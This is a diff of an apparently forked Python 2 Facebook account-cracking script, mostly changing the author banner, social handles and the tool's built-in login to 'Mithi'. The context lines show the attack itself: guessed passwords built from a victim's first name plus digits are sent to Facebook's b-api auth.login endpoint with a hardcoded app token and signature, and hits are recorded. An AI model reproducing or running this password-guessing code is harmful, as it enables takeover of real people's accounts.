@@ -14,8 +14,6 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-
-
 def keluar():
 	print "\033[1;96m[!] \x1b[1;91mExit"
 	os.sys.exit()
@@ -47,19 +45,19 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
+logo = """ 
+
+\033[1;91m███╗░░░███╗██╗████████╗██╗░░██╗█\033[1;91m█╗
+\033[1;91m████╗░████║██║╚══██╔══╝██║░░██║█\033[1;91m█║
+\033[1;91m██╔████╔██║██║░░░██║░░░███████║█\033[1;91m█║
+\033[1;91m██║╚██╔╝██║██║░░░██║░░░██╔══██║█\033[1;91z
+\033[1;91m██║░╚═╝░██║██║░░░██║░░░██║░░██║█\033[1;91m█║
+\033[1;91m╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚\033[1;91m═╝
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
+\033[1;96mAuthor  \033[1;93m: \033[1;92mRafin Aahil
+\033[1;96mInstagram \033[1;93m: \033[1;FlowRafin
 \033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/Rafin
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +78,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
+\033[1;96mAuthor  \033[1;93m: \033[1;92mRafin Aahil
 \033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mFacebook  \033[1;93m: \033[1;92m RafinAhmed44
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/Rafin
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Mithi"
+CorrectPassword = "Mithi"
 
 loop = 'true'
 while (loop == 'true'):
@@ -358,7 +356,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + '12'
+											pass5 = b['first_name'] + '11'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
